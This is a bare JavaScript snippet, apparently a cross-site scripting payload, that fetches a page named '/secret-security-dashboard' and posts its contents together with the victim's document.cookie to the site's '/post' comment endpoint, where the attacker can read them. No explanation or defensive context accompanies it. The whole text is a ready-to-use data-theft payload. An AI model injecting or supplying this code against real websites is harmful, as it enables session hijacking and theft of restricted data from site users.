fetch('/secret-security-dashboard')
  .then(res => res.text())   
  .then(txt => fetch('/post', {
    method: 'POST',                 
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'comment-author=' + encodeURIComponent(txt) +
          '&comment2=' + encodeURIComponent(document.cookie)
  }))
